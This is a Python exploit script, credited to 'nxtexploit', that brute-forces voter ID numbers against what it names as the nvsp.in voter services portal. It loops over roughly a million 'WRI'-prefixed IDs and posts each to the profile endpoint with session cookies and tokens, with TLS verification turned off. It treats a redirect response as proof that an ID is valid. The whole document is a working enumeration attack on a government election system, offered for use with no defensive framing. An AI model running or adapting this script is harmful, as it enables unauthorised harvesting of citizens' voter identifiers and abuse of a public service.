
# Exploit Author: nxtexploit
# written for bruteforcing Voter-IDs

import urllib3
import requests
import time
from termcolor import colored
urllib3.disable_warnings()
start = time.perf_counter() 

cookies = {
    'nvsp': '4e565XXXXX',
    'cookiesession1': '678B286C164561FFEFXXXXXXXXXXX',
    'nvsp': '4e56XXXXX',
    'nvspid': 'ycnpiabqfasdf0asdf09ad',
    '__RequestVerificationToken': 'taDxPTIR3vxuyduujVCoi5eJdSlsAv1X0MQea7VYvLf6ksNDNsK7BkQZbNLSKagASDFpouasdfuopasfcsCmlofM6tTlC1opGS9FBEjYYXxC-z9ze73zdtEjUXtq9JfGVDfsXwt3WmQ925gSsbUw2',
    '.ASPXAUTH': '53BDCF7905E361CB6ECE80B77506A1A4A54DFS6546A5DF787AS8DFB2B9CE6874FDE524BF7BAE0DDC59329705AB29D49A148B4494341EC7634C13DB69FA25425DCA10CAADA3A10B025D58D8220E842959F0C650A8DF39B43039354B537BCE61AFB4922B99E22F20DC099C0DE9BC2CA53D1A37F387867855DDE5D89583B2F5F95D898A',
}

headers = {
    'Host': 'www.nvsp.in',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://www.nvsp.in',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.nvsp.in/Account/MyProfile',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}


for voter_ID in range(2000000,2999999,1):


    data = '__RequestVerificationToken=dayrB-CCldwVYHXi7OE8b455jM3jLXRIdlHGQ5Wf4XyFE_7jjo1X3VfmkC4ZanqFO6h0XtveuAmSk1SIWWmV-SbA7nTUIJNKAfyRoiG43FvEAlDPi5VfkJWpGn9sV8IuFuBezLnC-tZSYFGqrRbECXgqlxpSduENgqaWy7oWQK01&OTP=&UserId=UQH34XXXXXXXX&firstName=Aziz&lastName=&Email=XXXXXXXX%40gmaill.com&Epic_no=WRI'+str(voter_ID)+'&PhoneNumber=XXXXXXXX87&st_code=S25&ac_no=55&PART_NO=42&Captcha=&Code='

    response = requests.post('https://www.nvsp.in/Account/MyProfile',allow_redirects=False, cookies=cookies, headers=headers, data=data, verify=False)

    if response.status_code == 302:
        print(f"Epic-ID FOUND = "+colored("WRI"+str(voter_ID),'green'))
    elif response.status_code == 200:
        print(colored("Not valid ID",'yellow'))
    else:
        print(colored("Session Expired ",'red')+"(response code = "+colored(str(response.status_code),'yellow')+")")

finish = time.perf_counter()

print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')
